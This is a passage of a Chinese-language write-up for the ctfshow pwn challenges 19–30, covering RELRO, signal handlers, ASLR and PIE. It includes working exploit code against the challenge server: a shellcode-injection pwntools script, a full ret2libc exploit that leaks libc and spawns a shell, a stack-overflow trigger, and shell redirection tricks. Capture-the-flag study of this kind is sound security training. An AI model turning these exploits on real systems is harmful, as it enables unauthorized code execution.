href=\"#pwn19linux基础命令\">#</a> pwn19（Linux 基础命令）</h1>\n<h2 id=\"题目-14\"><a class=\"anchor\" href=\"#题目-14\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5nYRS.png\" alt=\"\" /></p>\n<p>64 位程序，保护全开，ida 查看</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5M0Zd.png\" alt=\"\" /></p>\n<p>发现调用了一个 fork 函数， <code>fork函数返回两次，子进程返回0，父进程返回子进程的pid</code> （执行返回值顺序是不定的），所以当是子进程返回 0 时才能到 <code>else</code>  段继续写入执行得到 flag</p>\n<p>又有一个 <code>fclose()</code>  函数，它关闭了一个输出流，我们要对其进行绕过，通过 <code>Linux命令</code> 中的 <code>exec 1&gt;&amp;0</code>  将标准输出流重定向到标准输入流里，并且在打开终端后都默认指向终端，所以会输出到终端上</p>\n<p>最后输入 <code>exec cat /ctf* 1&gt;&amp;0</code>  会将 flag 输出到终端上，也可以是 <code>exec sh 1&gt;&amp;0</code>  进行 shell 交互得到 flag</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP53ckj.png\" alt=\"\" /></p>\n<h1 id=\"pwn20relro保护\"><a class=\"anchor\" href=\"#pwn20relro保护\">#</a> pwn20（RELRO 保护）</h1>\n<p><strong>RELRO（RELocation Read-Only）</strong> 是一种可选的二进制保护机制，用于增加程序的安全性。它主要通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure LinkageTable，简称 PLT）的可写性来防止针对这些结构的攻击。</p>\n<p>RELRO 保护有三种状态：</p>\n<ol>\n<li>No RELRO：在这种状态下，GOT 和 PLT 都是可写的，意味着攻击者可以修改这些表中的指针，从而进行攻击。这是最弱的保护状态。</li>\n<li>Partial RELRO：在这种状态下，GOT 的开头部分被设置为只读（RO），而剩余部分仍然可写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</li>\n<li>Full RELRO：在这种状态下，GOT 和 PLT 都被设置为只读（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止</li>\n</ol>\n<h2 id=\"题目-15\"><a class=\"anchor\" href=\"#题目-15\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP53vjK.png\" alt=\"\" /></p>\n<p>got 表是否可写通过保护 RELRO 查看，FULL RELRO 代表着 got 表不可写，<br />\nNO RELRO 代表可写，代表部分可写<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP58PNd.png\" alt=\"\" /><br />\n此处 <code>No RELRO</code>  代表 got 表可写，plt 表可写</p>\n<p>然后查看 <code>.got</code>  表和 <code>.plt.got</code>  表地址，利用命令在终端上直接输入 <code>readelf -s pwn20</code>  即可（也可利用 ida 查看）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIkEMn.md.png\" alt=\"\" /></p>\n<p 1_1_0x600f18_0x600f28=\"\">ctfshow</p>\n<h1 id=\"pwn21relro保护\"><a class=\"anchor\" href=\"#pwn21relro保护\">#</a> pwn21（RELRO 保护）</h1>\n<h2 id=\"题目-16\"><a class=\"anchor\" href=\"#题目-16\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/20/pPIkMiF.png\" alt=\"\" /></p>\n<p>查看保护<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIAPw6.png\" alt=\"\" /><br />\n发现是 <code>Partial RELRO</code>  保护开启了一部分， <code>got</code>  表开头部分被设置为只读，其他的剩余部分仍然可写，所以这里是 <code>got</code>  不可写， <code>.plt.got</code>  可写</p>\n<p>查看各表的地址<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIAEfe.png\" alt=\"\" /></p>\n<p 0_1_0x600ff0_0x601000=\"\">ctfshow</p>\n<h1 id=\"pwn22-relro\"><a class=\"anchor\" href=\"#pwn22-relro\">#</a> pwn22 （RELRO）</h1>\n<h2 id=\"题目-17\"><a class=\"anchor\" href=\"#题目-17\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqrwPH.png\" alt=\"\" /></p>\n<p>查看保护</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqrsMt.png\" alt=\"\" /></p>\n<p>FULL RELRO:</p>\n<p>got 表和 plt 表都只读</p>\n<p>利用 <code>readelf -s pwn22</code>  查看表的地址，发现没有 <code>.got.plt</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/30/pPqrhGj.png\" alt=\"\" /></p>\n<p><code>ctfshow&#123;0_0_0x600fc0&#125;</code></p>\n<h1 id=\"pwn23signal信号处理\"><a class=\"anchor\" href=\"#pwn23signal信号处理\">#</a> pwn23（signal 信号处理）</h1>\n<h2 id=\"知识点\"><a class=\"anchor\" href=\"#知识点\">#</a> 知识点:</h2>\n<h3 id=\"1函数原型\"><a class=\"anchor\" href=\"#1函数原型\">#</a> 1. 函数原型</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span>（<span class=\"token operator\">*</span> signal（<span class=\"token keyword\">int</span> sig，<span class=\"token keyword\">void</span>（<span class=\"token operator\">*</span> func）（<span class=\"token keyword\">int</span>）））（<span class=\"token keyword\">int</span>）<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>关注内部的 <code>signal（int sig，void（* func）（int）)</code> ，sig 是指定的信号编号，用来以该指定的方式来处理信号（指定使用 sig 指定的信号编号处理信号的方法）<br />\n参数 func 指定程序可以处理信号的三种方式：</p>\n<ul>\n<li>默认处理（SIG_DFL）：信号由该特定信号的默认动作处理。</li>\n<li>忽略信号（SIG_IGN）：忽略信号，即使没有意义，代码执行仍将继续。</li>\n<li>函数处理程序：定义一个特定的函数来处理信号。</li>\n</ul>\n<h3 id=\"2有时候func这个参数-也可以是我们自定义的参数\"><a class=\"anchor\" href=\"#2有时候func这个参数-也可以是我们自定义的参数\">#</a> 2. 有时候 Func 这个参数 也可以是我们自定义的参数</h3>\n<p><code>signal(11,sigsegv_handler);</code> <br />\n 这里 11 也代指 <code>SIGSEGV</code> 【（信号分段违规）对存储的无效访问：当程序试图在已分配的内存之外读取或写入时】，意味着当程序想读写未分配给它的内存时，让 <code>sigsegv_handler</code>  函数来处理</p>\n<p>而 <code>sigsegv_handler</code>  函数可以自定义来执行</p>\n<p>所以我们需要触发对应的信号来执行 <code>信号处理函数</code></p>\n<h2 id=\"题目-18\"><a class=\"anchor\" href=\"#题目-18\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqroMq.png\" alt=\"\" /></p>\n<p>查看保护</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqrbZT.png\" alt=\"\" /></p>\n<p>32 位程序，开启了 nx，先利用 ssh 连接一下</p>\n<p><code>ssh ctfshow@pwn.challenge.ctf.show -p28151</code> <br />\n 连接后根据提示输入 <code>yes</code>  和 <code>密码</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqyQj1.png\" alt=\"\" /><br />\n此时程序还未运行， <code>ls</code>  查看一下</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqy1nx.png\" alt=\"\" /><br />\n利用命令 <code>./pwnme</code>  执行该文件</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqyJAO.png\" alt=\"\" /></p>\n<h2 id=\"程序源代码\"><a class=\"anchor\" href=\"#程序源代码\">#</a> 程序源代码</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqsSQ1.png\" alt=\"\" /><br />\n<img data-src=\"https://img1.imgtp.com/2023/09/30/KvRo0B08.png\" alt=\"\" /></p>\n<p>发现有一个 <code>signal函数</code> ，里面有 <code>flag</code></p>\n<pre><code>程序定义了一个信号量，当出现这个信号量（非法内存访问）的时候，会执行sigsegv_handler函数\n\n即当我们非法内存访问的时候，会将我们的flag通过标准错误打印出来（fflush（stderr））\n</code></pre>\n<p>为了输出 flag ，我们需要触发信号量，也就是触发 <code>非法内存访问</code> 来执行 <code>sigsegv_handler</code>  打印我们的 <code>flag</code> ，所以利用栈溢出即可完成这个触发</p>\n<p>但是我们怎么输入？可以看见 <code>argc</code>  为 <code>main</code>  函数的参数，当我们输入命令时，就相当于输入了 <code>argc</code> （这里输入要执行程序命令和 <code>参数一起输入</code> ）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqya3d.png\" alt=\"\" /></p>\n<p>在 <code>ctfshow函数</code> 里会将 <code>src</code>  复制到 <code>dest</code>  上 (也就是将 argc 复制到栈上)，利用这里我们就可以进行栈溢出， <code>dest</code>  在栈的大小为 0x3e（62），当我们输入 66 个 padding 时 (不知道和执行程序命令中间的 <code>空格算不算一个字符</code> ，但是输入 65 个会是段错误) 就可以得到 flag</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqyL8J.png\" alt=\"\" /></p>\n<h1 id=\"pwn24shellcode\"><a class=\"anchor\" href=\"#pwn24shellcode\">#</a> pwn24(shellcode)</h1>\n<h2 id=\"题目-19\"><a class=\"anchor\" href=\"#题目-19\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqyvK1.png\" alt=\"\" /></p>\n<p>32 位仅部分开启 RELRO 保护可以看到存在一个 RWX 权限的段，即可读可写可执行的段，没有开启 NX 考虑写入 <code>shellcode</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/30/pPq6pVK.png\" alt=\"\" /></p>\n<p><code>main函数</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/30/pPqcQw6.png\" alt=\"\" /></p>\n<p>ctfshow 函数无法反汇编，直接查看汇编代码</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqcN6A.png\" alt=\"\" /></p>\n<p>这里我们发现 read 可以溢出，并且 <code>call</code>  后面还会去执行 <code>eax</code>  也就是执行我们写入的 <code>buf</code> ，由此我们就可以直接注入 <code>shellcode</code></p>\n<p>官方解释：<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/30/TWlSIl88.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn24')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.challenge.ctf.show'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28141</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://img1.imgtp.com/2023/09/30/31VQIis2.png\" alt=\"\" /></p>\n<h1 id=\"pwn25ret2libc\"><a class=\"anchor\" href=\"#pwn25ret2libc\">#</a> pwn25（ret2libc）</h1>\n<h2 id=\"1题目\"><a class=\"anchor\" href=\"#1题目\">#</a> 1. 题目：</h2>\n<p>已经说明了用 <code>ret2libc</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOIT3t.png\" alt=\"\" /></p>\n<p>开启了 NX 保护，无法利用 shellcode<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOIOHg.png\" alt=\"\" /></p>\n<p>main:<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOotPA.png\" alt=\"\" /></p>\n<p>ctfshow:<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOoU2t.png\" alt=\"\" /></p>\n<p>可以栈溢出，没有后面函数，但是调用了 write 函数，我们可以利用来泄露 libc 地址</p>\n<h2 id=\"泄露libc地址\"><a class=\"anchor\" href=\"#泄露libc地址\">#</a> 泄露 libc 地址：</h2>\n<p>32 位程序是先一系列调用的函数然后再是参数，通过栈溢出来调用 write 输出 wire 的真实地址来得到 libc 的基址，从而知道 <code>system</code>  地址来 <code>getshell</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>write<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp:</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./32libc.so.6\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./pwn25')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn25'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.challenge.ctf.show'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28202</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>write_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>write_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>read_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>read_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>main<span class=\"token operator\">=</span><span class=\"token number\">0x080484F6</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>write<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"wiret=\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc_base<span class=\"token operator\">=</span>write<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>（这里找到都是 64 位的库，我以为不行，谁知道最后居然可以）<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOHLzn.png\" alt=\"\" /></p>\n<h1 id=\"pwn26alsr\"><a class=\"anchor\" href=\"#pwn26alsr\">#</a> pwn26（ALSR）</h1>\n<p>ASLR 是 <code>Linux操作系统</code> 的功能选项，作用于程序 (ELF) 装入 <code>内存</code> 运行时。是一种针对缓冲区溢出的安全保护技术，通过对加载地址的随机化，防止攻击者直接定位攻击代码位置，到达阻止溢出攻击的一种技术。</p>\n<h2 id=\"题目-20\"><a class=\"anchor\" href=\"#题目-20\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPObCi4.png\" alt=\"\" /></p>\n<p>64 位程序，ida 查看一下，发现当 ALSR 级别为 0 时得到正确的 flag<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/05/pPXZOp9.png\" alt=\"\" /></p>\n<p>我们查看一下本机 Linux 系统的 ALSR 开启的级别</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">cat</span> /proc/sys/kernel/randomize_va_space</pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPOq3h4.png\" alt=\"\" /><br />\n看到等级为 2</p>\n<p>在 gdb 中修改等级</p>\n<pre><code>关闭ASLR:\nset disable-randomization on\n查看ASLR开启情况：\nshow disable-randomization\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/05/pPXZWSs.png\" alt=\"\" /></p>\n<p>运行：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/05/pPXeE6I.png\" alt=\"\" /></p>\n<h1 id=\"pwn27aslr\"><a class=\"anchor\" href=\"#pwn27aslr\">#</a> pwn27(ASLR)</h1>\n<h2 id=\"题目-21\"><a class=\"anchor\" href=\"#题目-21\">#</a> 题目:</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/05/pPXeQhQ.png\" alt=\"\" /></p>\n<p>64 位程序，没有开启 pie<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/05/pPXe8cn.png\" alt=\"\" /></p>\n<p>这里运行得到了正确的 flag，查看发现关闭了 ASLR<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/05/pPXeN7T.png\" alt=\"\" /></p>\n<h1 id=\"pwn28-alsr与pie\"><a class=\"anchor\" href=\"#pwn28-alsr与pie\">#</a> pwn28 （ALSR 与 PIE）</h1>\n<h2 id=\"题目-22\"><a class=\"anchor\" href=\"#题目-22\">#</a> 题目：</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/05/pPXe49H.png\" alt=\"\" /></p>\n<p>64 位程序，没有开启 pie</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/05/pPXmZ8J.png\" alt=\"\" /></p>\n<p>这里看见打印的是函数地址，因为没有开启 pie 所以 <code>函数地址</code> 不变<br />\n<img data-src=\"https://img1.imgtp.com/2023/10/05/6e5CVy39.png\" alt=\"\" /></p>\n<p>直接运行：</p>\n<p><img data-src=\"https://img1.imgtp.com/2023/10/05/ozvhAc0A.png\" alt=\"\" /></p>\n<h1 id=\"pwn29-alsr与pie都开启\"><a class=\"anchor\" href=\"#pwn29-alsr与pie都开启\">#</a> pwn29 (ALSR 与 PIE 都开启)</h1>\n<h2 id=\"题目-23\"><a class=\"anchor\" href=\"#题目-23\">#</a> 题目</h2>\n<p><img data-src=\"https://img1.imgtp.com/2023/10/05/3T7X5Lrq.png\" alt=\"\" /></p>\n<p>保护全开：</p>\n<p><img data-src=\"https://img1.imgtp.com/2023/10/05/xYndSUCf.png\" alt=\"\" /></p>\n<p>可以看到提示，也直接给了 flag：<br />\n<img data-src=\"https://img1.imgtp.com/2023/10/05/sTm8a0iP.png\" alt=\"\" /></p>\n<p><img data-src=\"https://img1.imgtp.com/2023/10/05/0xSl0Q9u.png\" alt=\"\" /></p>\n<h1 id=\"pwn30关闭pie\"><a class=\"anchor\" href=\"#pwn30关闭pie\">#</a> pwn30（关闭 PIE）</h1>\n<h2 id=\"题目-24\"><a class=\"anchor\" href=\"#题目-24\">#</a> 题目：</h2>\n<p><img data-src=\"https://img1.imgtp.com/2023/10/05/kNueQiYz.png\" alt=\"\" /></p>\n<p>32 位程序，PIE 保护关闭了<br />\n<img data-src=\"https://img1.imgtp.com/2023/10/05/YBi8Hkha.png\" alt=\"\" /></p>\n<p>伪代码：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_8048710<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_8048784<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token 